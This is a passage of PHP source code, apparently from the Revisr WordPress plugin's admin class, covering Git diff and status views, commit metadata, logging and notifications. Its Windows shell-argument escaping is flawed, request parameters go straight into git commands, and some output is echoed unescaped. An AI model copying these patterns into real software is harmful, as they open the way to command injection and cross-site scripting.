			echo $this->revisr->git->count_unpulled();
		} else {
			echo $this->revisr->git->count_unpushed();
		}
		exit();
	}

	/**
	 * Deletes existing transients.
	 * @access public
	 */
	public static function clear_transients( $errors = true ) {
		if ( true === $errors ) {
			delete_transient( 'revisr_error' );
			delete_transient( 'revisr_error_details' );
		} else {
			delete_transient( 'revisr_alert' );
		}
	}

	/**
	 * Counts the number of commits in the database on a given branch.
	 * @access public
	 * @param  string $branch The name of the branch to count commits for.
	 */
	public static function count_commits( $branch ) {
		global $wpdb;
		if ( $branch == 'all' ) {

			$num_commits = $wpdb->get_results( "SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = 'branch'" );
		} else {
			$num_commits = $wpdb->get_results( $wpdb->prepare( "SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = 'branch' AND meta_value = %s", $branch ) );
		}
		return count( $num_commits );
	}

	/**
	 * Escapes a shell arguement.
	 * @access public
	 * @param  string $string The string to escape.
	 * @return string $string The escaped string.
	 */
	public static function escapeshellarg( $string ) {
		$os = Revisr_Compatibility::get_os();

		if ( 'WIN' !== $os['code'] ) {
			return escapeshellarg( $string );
		} else {
			// Windows-friendly workaround.
			return '"' . str_replace( "'", "'\\''", $string ) . '"';
		}
	}

	/**
	 * Gets an array of details on a saved commit.
	 * @access public
	 * @param  string $id The WordPress Post ID associated with the commit.
	 * @return array
	 */
	public static function get_commit_details( $id ) {

		// Grab the values from the post meta.
		$branch 			= get_post_meta( $id, 'branch', true );
		$hash 				= get_post_meta( $id, 'commit_hash', true );
		$db_hash 			= get_post_meta( $id, 'db_hash', true );
		$db_backup_method	= get_post_meta( $id, 'backup_method', true );
		$files_changed 		= get_post_meta( $id, 'files_changed', true );
		$committed_files 	= get_post_meta( $id, 'committed_files' );
		$git_tag 			= get_post_meta( $id, 'git_tag', true );
		$status 			= get_post_meta( $id, 'commit_status', true );
		$error 				= get_post_meta( $id, 'error_details' );

		// Store the values in an array.
		$commit_details = array(
			'branch' 			=> $branch ? $branch : __( 'Unknown', 'revisr' ),
			'commit_hash' 		=> $hash ? $hash : __( 'Unknown', 'revisr' ),
			'db_hash' 			=> $db_hash ? $db_hash : '',
			'db_backup_method'	=> $db_backup_method ? $db_backup_method : '',
			'files_changed' 	=> $files_changed ? $files_changed : 0,
			'committed_files' 	=> $committed_files ? $committed_files : array(),
			'tag'				=> $git_tag ? $git_tag : '',
			'status'			=> $status ? $status : '',
			'error_details' 	=> $error ? $error : false
		);

		// Return the array.
		return $commit_details;
	}

	/**
	 * Returns the ID of a commit with a provided commit hash.
	 * @access public
	 * @param  string 	$commit_hash The commit hash to check.
	 * @param  boolean 	$return_link If set to true, will return as a link.
	 * @return mixed
	 */
	public static function get_the_id_by_hash( $commit_hash, $return_link = false ) {
		global $wpdb;
		$query 	= $wpdb->prepare( "SELECT post_id FROM $wpdb->postmeta WHERE meta_key = 'commit_hash' AND meta_value = %s", $commit_hash );
		$result = $wpdb->get_results( $query, ARRAY_A );

		if ( $result ) {

			if ( true === $return_link ) {
				$url 	= wp_nonce_url( get_admin_url() . 'post.php?post=' . $result[0]['post_id'] . '&action=edit', 'edit', 'revisr_edit_nonce' );
				$link 	= sprintf( '<a href="%s" target="_blank">%s</a>', $url, $commit_hash );
				return $link;
			}

			return $result[0]['post_id'];
		}

		return false;
	}

	/**
	 * Logs an event to the database.
	 * @access public
	 * @param  string $message The message to show in the Recent Activity.
	 * @param  string $event   Will be used for filtering later.
	 */
	public static function log( $message, $event ) {
		global $wpdb;
		$time  = current_time( 'mysql' );
		$table = $wpdb->prefix . 'revisr';
		$wpdb->insert(
			"$table",
			array(
				'time' 		=> $time,
				'message'	=> $message,
				'event' 	=> $event,
			),
			array(
				'%s',
				'%s',
				'%s',
			)
		);
	}

	/**
	 * Notifies the admin if notifications are enabled.
	 * @access private
	 * @param  string $subject The subject line of the email.
	 * @param  string $message The message for the email.
	 */
	public static function notify( $subject, $message ) {
		$options 	= Revisr::get_options();
		$url 		= get_admin_url() . 'admin.php?page=revisr';

		if ( isset( $options['notifications'] ) ) {
			$email 		= $options['email'];
			$message	.= '<br><br>';
			$message	.= sprintf( __( '<a href="%s">Click here</a> for more details.', 'revisr' ), $url );
			$headers 	= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			wp_mail( $email, $subject, $message, $headers );
		}
	}

	/**
	 * Renders an alert and removes the old data.
	 * @access public
	 */
	public function render_alert() {
		$alert = get_transient( 'revisr_alert' );
		$error = get_transient( 'revisr_error' );
		if ( $error ) {
			echo "<div class='revisr-alert error'>" . wpautop( $error ) . "</div>";
		} else if ( $alert ) {
			echo "<div class='revisr-alert updated'>" . wpautop( $alert ) . "</div>";
		} else {
			if ( $this->revisr->git->count_untracked() == '0' ) {
				printf( __( '<div class="revisr-alert updated"><p>There are currently no untracked files on branch %s.', 'revisr' ), $this->revisr->git->branch );
			} else {
				$commit_link = get_admin_url() . 'post-new.php?post_type=revisr_commits';
				printf( __('<div class="revisr-alert updated"><p>There are currently %s untracked files on branch %s. <a href="%s">Commit</a> your changes to save them.</p></div>', 'revisr' ), $this->revisr->git->count_untracked(), $this->revisr->git->branch, $commit_link );
			}
		}
		exit();
	}

	/**
	 * Processes a diff request.
	 * @access public
	 */
	public function view_diff() {
		?>
		<html>
		<head>
			<title><?php _e( 'View Diff', 'revisr' ); ?></title>
		</head>
		<body>
		<?php

			if ( isset( $_REQUEST['commit'] ) ) {
				$diff = $this->revisr->git->run( 'show', array( $_REQUEST['commit'], $_REQUEST['file'] ) );
			} else {
				$diff = $this->revisr->git->run( 'diff', array( $_REQUEST['file'] ) );
			}

			if ( is_array( $diff ) ) {

				// Loop through the diff and echo the output.
				foreach ( $diff as $line ) {
					if ( substr( $line, 0, 1 ) === '+' ) {
						echo '<span class="diff_added" style="background-color:#cfc;">' . htmlspecialchars( $line ) . '</span><br>';
					} else if ( substr( $line, 0, 1 ) === '-' ) {
						echo '<span class="diff_removed" style="background-color:#fdd;">' . htmlspecialchars( $line ) . '</span><br>';
					} else {
						echo htmlspecialchars( $line ) . '<br>';
					}
				}

			} else {
				_e( 'Oops! Revisr ran into an error rendering the diff.', 'revisr' );
			}
		?>
		</body>
		</html>
		<?php
		exit();
	}

	/**
	 * Processes a view error request.
	 * @access public
	 */
	public function view_error() {
		?>
		<html>
		<head>
		<title><?php _e( 'Error Details', 'revisr' ); ?></title>
		</head>
		<body>
			<?php
				if ( isset( $_REQUEST['post_id'] ) && get_post_meta( $_REQUEST['post_id'], 'error_details', true ) ) {
					echo implode( '<br>', get_post_meta( $_REQUEST['post_id'], 'error_details', true ) );
				} elseif ( $revisr_error = get_transient( 'revisr_error_details' ) ) {
					echo implode( '<br>', $revisr_error );
				} else {
					_e( 'Detailed error information not available.', 'revisr' );
				}
			?>
		</body>
		</html>
		<?php
	}

	/**
	 * Processes a view status request.
	 * @access public
	 */
	public function view_status() {
		?>
		<html>
		<head>
		<title><?php _e( 'View Status', 'revisr' ); ?></title>
		</head>
		<body>
		<?php
			$status = $this->revisr->git->run( 'status', array() );

			if ( is_array( $status ) ) {
				echo '<pre>';
				foreach ( $status as $line ) {
					echo $line . PHP_EOL;
				}
				echo '</pre>';
			} else {
				_e( 'Error retrieving the status of the repository.', 'revisr' );
			}
		?>
		</body>
		</html>
		<?php
		exit();
	}

	/**
	 * Updates user settings to be compatible with 1.8.
	 * @access public
	 */
	public function do_upgrade() {

		// Check for the "auto_push" option and save it to the config.
		if ( isset( $this->revisr->options['auto_push'] ) ) {
			$this->revisr->git->set_config( 'revisr', 'auto-push', 'true' );
		}

		// Check for the "auto_pull" option and save it to the config.
		if ( isset( $this->revisr->options['auto_pull'] ) ) {
			$this->revisr->git->set_config( 'revisr', 'auto-pull', 'true' );
		}

		// Check for the "reset_db" option and save it to the config.
		if ( isset( $this->revisr->options['reset_db'] ) ) {
			$this->revisr->git->set_config( 'revisr', 'import-checkouts', 'true' );
		}

		// Check for the "mysql_path" option and save it to the config.
		if ( isset( $this->revisr->options['mysql_path'] ) ) {
			$this->revisr->git->set_config( 'revisr', 'mysql-path', $this->revisr->options['mysql_path'] );
		}

		// Configure the database tracking to use all tables, as this was how it behaved in 1.7.
		$this->revisr->git->set_config( 'revisr', 'db_tracking', 'all_tables' );

		// We're done here.
		update_option( 'revisr_db_version', '1.1' );
	}

	/**
	 * Displays the "Sponsored by Site5" logo.
	 * @access public
	 */
	public function site5_notice() {
		$allowed_on = array( 'revisr', 'revisr_settings', 'revisr_commits', 'revisr_settings', 'revisr_branches' );
		if ( isset( $_GET['page'] ) && in_array( $_GET['page'], $allowed_on ) ) {
			$output = true;
		} else if ( isset( $_GET['post_type'] ) && in_array( $_GET['post_type'], $allowed_on ) || get_post_type() == 'revisr_commits' ) {
			$output = true;
		} else {
			$output = false;
		}
		if ( $output === true ) {
			?>
			<div id="site5_wrapper">
				<?php _e( 'Sponsored by', 'revisr' ); ?>
				<a href="http://www.site5.com/" target="_blank"><img id="site5_logo" src="<?php echo REVISR_URL . 'assets/img/site5.png'; ?>" width="80" /></a>
			</div>
			<?php
		}
	}

	/**
	 * Returns an escaped array suitable for attributes.
	 * @access public
	 * @param  array $input An array of input to filter.
	 * @return array
	 */
	public static function esc_attr_array( $input ) {
		return array_map( 'esc_attr', $input );
	}

	/**
	 * Includes the template for the main dashboard.
	 * @access public
	 */
	public function revisr_dashboard() {
		include_once REVISR_PATH . 'templates/dashboard.php';
	}

	/**
	 * Includes the template for the branches page.
	 * @access public
	 */
	public function revisr_branches() {
		include_once REVISR_PATH . 'templates/branches.php';
	}

	/**
	 * Includes the template for the settings page.
	 * @access public
	 */
	public function revisr_settings() {
		include_once REVISR_PATH . 'templates/settings.php';
	}

	/**
	 * Displays the form to delete a branch.
	 * @access public
	 */
	public function delete_branch_form() {
		include_once REVISR_PATH . 'assets/partials/delete-branch-form.php';
	}

	/**
	 * Displays the form to merge a branch.
	 * @access public
	 */
	public function merge_branch_form() {
		include_once REVISR_PATH . 'assets/partials/merge-form.php';
	}

	/**
	 * Displays the form to pull a remote branch.
	 * @access public
	 */
	public function import_tables_form() {
		include_once REVISR_PATH . 'assets/partials/import-tables-form.php';
	}

	/**
	 * Displays the form to revert a commit.
	 * @access public
	 */
	public function revert_form() {
		include_once REVISR_PATH . 'assets/partials/revert-form.php';
	}
}
